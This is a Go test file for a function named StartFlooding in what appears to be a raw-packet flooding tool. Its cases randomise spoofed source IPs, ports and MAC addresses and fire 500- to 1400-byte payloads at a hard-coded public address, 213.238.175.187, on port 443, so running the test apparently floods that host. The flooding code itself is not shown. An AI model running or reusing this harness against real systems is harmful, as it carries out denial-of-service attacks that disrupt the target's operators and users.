package raw

import (
	"math/rand"
	"testing"
)

func TestStartFlooding(t *testing.T) {
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()
	cases := []struct {
		name                            string
		payloadLength, srcPort, dstPort int
		srcIp, dstIp                    string
		srcMacAddr, dstMacAddr          []byte
	}{
		{"500byte", 500, srcPorts[rand.Intn(len(srcPorts))], 443,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{"1000byte", 1000, srcPorts[rand.Intn(len(srcPorts))], 443,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{"1400byte", 1400, srcPorts[rand.Intn(len(srcPorts))], 443,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			StartFlooding(tc.dstIp, tc.dstPort, tc.payloadLength)
		})

	}
}
